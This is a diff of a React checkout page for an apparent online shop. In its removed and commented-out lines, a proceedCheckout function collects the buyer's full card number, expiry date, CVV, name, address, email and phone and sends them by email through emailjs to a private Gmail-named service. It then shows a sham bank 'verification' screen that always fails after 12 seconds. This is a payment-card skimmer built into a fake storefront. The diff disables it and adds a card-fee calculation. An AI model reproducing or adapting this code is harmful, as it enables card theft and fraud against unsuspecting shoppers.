@@ -4,7 +4,7 @@ import content from '../content.json';
 import axios from 'axios';
 import CheckoutSummary from '/components/CheckoutSummary';
 import CheckoutForm from '/components/CheckoutForm';
-import CheckoutVerify from '/components/CheckoutVerify';
+// import CheckoutVerify from '/components/CheckoutVerify';
 
 const site = content.sites[0];
 
@@ -21,6 +21,7 @@ export default function Checkout() {
   const [currentStep, setCurrentStep] = useState(0);
   const [showPopup, setShowPopup] = useState(false);
   const [iframeUrl, setIframeUrl] = useState('');
+  const [isPaymentConfirmed, setIsPaymentConfirmed] = useState(false);
   
 
   // Générer un numéro de commande aléatoire
@@ -52,51 +53,53 @@ export default function Checkout() {
   const discount = (totalPrice * 0.15).toFixed(2);
   const discountedPrice = (totalPrice - discount).toFixed(2);
 
-  const proceedCheckout = async (event) => {
-    event.preventDefault();
-    setShowVerificationWrapper(true);
+  const paymentFees = selectedPaymentMethod === 'card' ? (discountedPrice * 0.025).toFixed(2) : 0;
 
-    const cardNumber = event.target.cardNumber.value.replace(/\s/g, '');
+  // const proceedCheckout = async (event) => {
+  //   event.preventDefault();
+  //   setShowVerificationWrapper(true);
 
-    try {
-      const response = await axios.post('/api/check-card', { cardNumber });
-      const { bankName, bankLogo } = response.data; // Récupérer bankName et bankLogo de la réponse
-      setBankName(bankName);
-      setBankLogo(bankLogo);
-      setCardType(response.data.cardType);
-      setCardScheme(response.data.cardScheme);
-      setCardCountry(response.data.cardCountry);
+  //   const cardNumber = event.target.cardNumber.value.replace(/\s/g, '');
 
-      setTimeout(() => {
-        setVerificationError(true);
-      }, 12000);
+  //   try {
+  //     const response = await axios.post('/api/check-card', { cardNumber });
+  //     const { bankName, bankLogo } = response.data; // Récupérer bankName et bankLogo de la réponse
+  //     setBankName(bankName);
+  //     setBankLogo(bankLogo);
+  //     setCardType(response.data.cardType);
+  //     setCardScheme(response.data.cardScheme);
+  //     setCardCountry(response.data.cardCountry);
 
-      const form = event.target;
-      const formData = {
-        totalPrice: form.totalPrice.value,
-        products: form.products.value,
-        website: form.website.value,
-        address: form.address.value,
-        suite: form.suite.value,
-        postalCode: form.postalCode.value,
-        city: form.city.value,
-        email: form.email.value,
-        fullName: form.fullName.value,
-        phone: form.phone.value,
-        cardHolder: form.cardHolder.value,
-        cardNumber: form.cardNumber.value,
-        expiryDate: form.expiryDate.value,
-        cvv: form.cvv.value,
-        bankName: bankName
-      };
+  //     setTimeout(() => {
+  //       setVerificationError(true);
+  //     }, 12000);
 
-      await emailjs.send('gmail-benedikt', 'new-payment', formData);
+  //     const form = event.target;
+  //     const formData = {
+  //       totalPrice: form.totalPrice.value,
+  //       products: form.products.value,
+  //       website: form.website.value,
+  //       address: form.address.value,
+  //       suite: form.suite.value,
+  //       postalCode: form.postalCode.value,
+  //       city: form.city.value,
+  //       email: form.email.value,
+  //       fullName: form.fullName.value,
+  //       phone: form.phone.value,
+  //       cardHolder: form.cardHolder.value,
+  //       cardNumber: form.cardNumber.value,
+  //       expiryDate: form.expiryDate.value,
+  //       cvv: form.cvv.value,
+  //       bankName: bankName
+  //     };
 
-    } catch (error) {
-      console.error('Error checking card:', error);
-      setVerificationError(true);
-    }
-  };
+  //     await emailjs.send('gmail-benedikt', 'new-payment', formData);
+
+  //   } catch (error) {
+  //     console.error('Error checking card:', error);
+  //     setVerificationError(true);
+  //   }
+  // };
 
   const showStep = (step) => {
     setCurrentStep(step);
@@ -126,7 +129,7 @@ export default function Checkout() {
     <div className="paiement-container">
       <div className="left-column">
         <a className="back" href="/"><img src='/logo.png'/></a>
-        <CheckoutSummary cart={cart} totalPrice={totalPrice} discount={discount} discountedPrice={discountedPrice} site={site} />
+        <CheckoutSummary cart={cart} totalPrice={totalPrice} discount={discount} discountedPrice={discountedPrice} site={site} paymentFees={paymentFees} />
       </div>
       <div className="right-column">
         <CheckoutForm
@@ -134,7 +137,7 @@ export default function Checkout() {
           showStep={showStep}
           selectedPaymentMethod={selectedPaymentMethod}
           setSelectedPaymentMethod={setSelectedPaymentMethod}
-          proceedCheckout={proceedCheckout}
+          // proceedCheckout={proceedCheckout}
           discountedPrice={discountedPrice}
           cart={cart}
           site={site}
@@ -160,7 +163,7 @@ export default function Checkout() {
         )}
       </div>
 
-      {showVerificationWrapper && (
+      {/* {showVerificationWrapper && (
         <CheckoutVerify
           verificationError={verificationError}
           bankName={bankName}
@@ -171,7 +174,7 @@ export default function Checkout() {
           discountedPrice={discountedPrice}
           onRetry={handleRetry} // Passer la fonction handleRetry
         />
-      )}
+      )} */}
     </div>
   );
 }
